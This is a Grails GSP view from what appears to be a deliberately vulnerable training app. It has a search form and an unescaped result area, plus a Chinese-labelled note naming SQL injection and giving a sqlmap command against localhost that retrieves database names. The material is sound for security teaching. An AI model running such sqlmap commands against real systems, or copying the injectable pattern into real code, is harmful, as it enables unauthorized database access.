<%--
  Created by IntelliJ IDEA.
  User: pollochang
  Date: 8/15/24
  Time: 12:24 AM
--%>

<%@ page contentType="text/html;charset=UTF-8" %>
<html>
<head>
  <meta name="layout" content="common"/>
</head>

<body>

<div>
  <form action="${createLink(controller: 'start', action: 'filter2')}" method="post">
    <div>
      <span>strings</span>
      <input name="strings" type="text" />
      <input type="submit" value="查詢">

    </div>
    <div>
      ${rows}
    </div>
  </form>
</div>
<br>
<div>
  <h2>漏洞名稱: SQL Injection</h2>
  <h2>攻擊手段</h2>
  <div>sqlmap -u "http://localhost:8090/start/filter2?strings=ZAP" --dbs --level=1 --risk=1</div>
  <h2>成果</h2>
  <div>可以取得資料庫名稱</div>
</div>
</body>
</html>